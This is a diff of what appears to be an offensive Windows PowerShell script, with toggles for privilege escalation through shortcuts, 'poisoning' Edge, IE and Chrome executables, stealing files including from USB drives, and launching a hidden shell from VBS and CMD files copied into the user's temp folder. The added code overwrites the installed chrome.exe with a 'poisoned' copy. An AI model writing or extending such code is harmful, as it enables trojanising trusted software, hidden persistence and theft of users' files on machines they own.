@@ -10,7 +10,6 @@ $shortcut_privesc='no'
 # .exe Section:
 $poison_edge='no'
 $poison_ie='no'
-$poison_file_explorer='no'
 $poison_chrome='no'
 
 # File Stealing Section:
@@ -32,9 +31,9 @@ Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explo
 
 If ($invisile_shell_launcher -eq 'yes') {
   $invis_target="$Env:UserProfile\temp\"
-  robocopy "$PSScriptRoot\i.vbs" $invis_target
-  robocopy "$PSScriptRoot\a.cmd" $invis_target
-  robocopy "$PSScriptRoot\z.vbs" $invis_target
+  robocopy "$PSScriptRoot\i.vbs" $invis_target /S /MT /Z
+  robocopy "$PSScriptRoot\a.cmd" $invis_target /S /MT /Z
+  robocopy "$PSScriptRoot\z.vbs" $invis_target /S /MT /Z
 }
 
 
@@ -49,6 +48,16 @@ If ($steal_files_usb -eq 'yes') {
 }
 
 # Alright FTP time!
+
+# .exe Section (hella long)
+If ($poison_chrome -eq 'yes') {
+  $chrome_location="C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+  $poisoned_chrome_location="$PSScriptRoot\chrome.exe"
+  robocopy $poisoned_chrome_location $chrome_location /S /MT /Z
+}
+
+
+
 
 # Shortcut section (oh this is going to get complicated...)
 
